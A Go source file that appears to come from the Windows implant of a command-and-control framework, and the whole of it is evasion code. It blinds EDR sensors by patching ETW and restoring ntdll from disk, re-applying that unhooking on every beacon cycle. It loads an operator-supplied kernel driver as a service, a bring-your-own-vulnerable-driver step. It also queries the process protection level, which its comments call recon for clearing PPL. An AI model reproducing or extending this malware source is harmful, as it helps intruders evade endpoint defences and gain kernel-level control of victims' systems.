//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

// edrBlind applies the user-mode sensor-blinding subset: ETW patch +
// ntdll .text restore from disk. It reuses the same primitives as the
// standalone etw_bypass/unhook_ntdll tasks so behavior is identical, and
// arms the per-beacon re-unhook so EDRs that re-instrument ntdll between
// beacons are defeated continuously.
func edrBlind() string {
	var sb strings.Builder
	sb.WriteString("[edr_blind experimental] user-mode sensor blinding\n")
	sb.WriteString("etw: " + etwBypass() + "\n")
	sb.WriteString("unhook: " + unhookNtdll() + "\n")
	ntdllUnhooked = true
	sb.WriteString("re-unhook armed: yes (re-applied every beacon cycle)")
	return sb.String()
}

var (
	byovdAdvapi32         = syscall.NewLazyDLL("advapi32.dll")
	byovdOpenSCManagerW   = byovdAdvapi32.NewProc("OpenSCManagerW")
	byovdCreateServiceW   = byovdAdvapi32.NewProc("CreateServiceW")
	byovdOpenServiceW     = byovdAdvapi32.NewProc("OpenServiceW")
	byovdStartServiceW    = byovdAdvapi32.NewProc("StartServiceW")
	byovdCloseServiceHndl = byovdAdvapi32.NewProc("CloseServiceHandle")
	byovdDeleteService    = byovdAdvapi32.NewProc("DeleteService")
)

const (
	byovdSCManagerCreateService = 0x0002
	byovdServiceKernelDriver    = 1
	byovdServiceDemandStart     = 3
	byovdServiceErrorIgnore     = 0
	byovdServiceStart           = 0x0010
)

// byovdLoadDriver loads an operator-supplied driver through the Service
// Control Manager (demand-start kernel driver). The .sys bytes are never
// bundled with the implant; the operator stages them on the target first
// (e.g. via upload) and passes the absolute path here. Returns a status
// summary; an already-loaded driver reports success idempotently.
func byovdLoadDriver(driverPath, svcName string) (string, error) {
	if len(driverPath) > 260 || len(svcName) > 64 {
		return "", fmt.Errorf("byovd_load: path/service name too long")
	}
	lower := strings.ToLower(driverPath)
	if !strings.HasSuffix(lower, ".sys") {
		return "", fmt.Errorf("byovd_load: refusing non-.sys path %q", driverPath)
	}
	fi, err := os.Stat(driverPath)
	if err != nil {
		return "", fmt.Errorf("byovd_load: driver not accessible: %v", err)
	}
	if fi.Size() == 0 || fi.IsDir() {
		return "", fmt.Errorf("byovd_load: invalid driver file")
	}
	if svcName == "" {
		svcName = "forgec2drv"
	}
	for _, r := range svcName {
		if !(r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' || r == '_' || r == '-') {
			return "", fmt.Errorf("byovd_load: illegal service name %q", svcName)
		}
	}

	machine, _ := syscall.UTF16PtrFromString("")
	db, _ := syscall.UTF16PtrFromString("ServicesActive")
	scm, _, _ := byovdOpenSCManagerW.Call(
		uintptr(unsafe.Pointer(machine)),
		uintptr(unsafe.Pointer(db)),
		uintptr(byovdSCManagerCreateService),
	)
	if scm == 0 {
		return "", fmt.Errorf("byovd_load: OpenSCManager failed (need elevation)")
	}
	defer byovdCloseServiceHndl.Call(scm)

	nameP, _ := syscall.UTF16PtrFromString(svcName)
	dispP, _ := syscall.UTF16PtrFromString(svcName)
	binP, _ := syscall.UTF16PtrFromString("\\??\\" + driverPath)
	svc, _, _ := byovdCreateServiceW.Call(
		scm,
		uintptr(unsafe.Pointer(nameP)),
		uintptr(unsafe.Pointer(dispP)),
		uintptr(0xF01FF), // SERVICE_ALL_ACCESS
		uintptr(byovdServiceKernelDriver),
		uintptr(byovdServiceDemandStart),
		uintptr(byovdServiceErrorIgnore),
		uintptr(unsafe.Pointer(binP)),
		0, 0, 0, 0, 0,
	)
	if svc == 0 {
		// ERROR_SERVICE_EXISTS (1073): open the existing service instead.
		svc, _, _ = byovdOpenServiceW.Call(
			scm,
			uintptr(unsafe.Pointer(nameP)),
			uintptr(0xF01FF),
		)
		if svc == 0 {
			return "", fmt.Errorf("byovd_load: CreateService/OpenService failed (need elevation)")
		}
		defer byovdCloseServiceHndl.Call(svc)
	} else {
		defer byovdCloseServiceHndl.Call(svc)
	}

	ret, _, _ := byovdStartServiceW.Call(svc, 0, 0)
	if ret == 0 {
		if errno, ok := lastSyscallError(); ok && errno == 1056 { // ERROR_SERVICE_ALREADY_RUNNING
			return fmt.Sprintf("[byovd_load experimental] service %q already running (%s, %d bytes)", svcName, driverPath, fi.Size()), nil
		}
		// Start failed for another reason (often: signature enforcement for
		// an unsigned driver). Remove the service we just created so a retry
		// with a signed driver does not hit ERROR_SERVICE_EXISTS.
		byovdDeleteService.Call(svc)
		if errno, ok := lastSyscallError(); ok {
			return "", fmt.Errorf("byovd_load: StartService failed (errno %d — driver must be signed for this host)", errno)
		}
		return "", fmt.Errorf("byovd_load: StartService failed (driver must be signed for this host)")
	}
	return fmt.Sprintf("[byovd_load experimental] service %q started (%s, %d bytes)", svcName, driverPath, fi.Size()), nil
}

// lastSyscallError reports errno from the most recent failed syscall via
// GetLastError. Best-effort: exact code only sharpens the message.
func lastSyscallError() (syscall.Errno, bool) {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	proc := k32.NewProc("GetLastError")
	r, _, _ := proc.Call()
	if r == 0 {
		return 0, false
	}
	return syscall.Errno(r), true
}

// pplProtectionLevel queries the current process protection level
// (NtQueryInformationProcess, ProcessProtectionLevelInformation = 61) and
// reports signer/type. Read-only recon for planning: clearing PPL needs a
// kernel write primitive (operator-loaded driver), not this task.
func pplProtectionLevel() string {
	type protectionInfo struct {
		sigLevel   byte
		sectionSig byte
		protection byte
		_pad       byte
		_pad2      [4]byte
	}
	const processProtectionLevelInfo = 61
	proc := ntdllProc(antidebugNtdll, hashNtQueryInformationProcess, s(SProcNtQIP))
	var info protectionInfo
	var retLen uint32
	ret, _, _ := proc.Call(
		^uintptr(0), // current process pseudo-handle
		uintptr(processProtectionLevelInfo),
		uintptr(unsafe.Pointer(&info)),
		uintptr(unsafe.Sizeof(info)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if ret != 0 {
		return `{"protected":false,"note":"protection query failed (need Win8.1+)"}`
	}
	signerNames := map[byte]string{
		0: "none", 1: "authenticode", 2: "codegen", 3: "antimalware",
		4: "lra", 5: "windows", 6: "winTcb", 7: "winSystem", 8: "app",
	}
	typeNames := map[byte]string{0: "none", 1: "light", 2: "full"}
	protType := info.protection & 0x07
	signer := (info.protection >> 3) & 0x0F
	sn, ok := signerNames[signer]
	if !ok {
		sn = "unknown"
	}
	tn, ok := typeNames[protType]
	if !ok {
		tn = "unknown"
	}
	return fmt.Sprintf(`{"protected":%t,"type":%q,"signer":%q,"signature_level":%d}`,
		protType != 0, tn, sn, info.sigLevel)
}
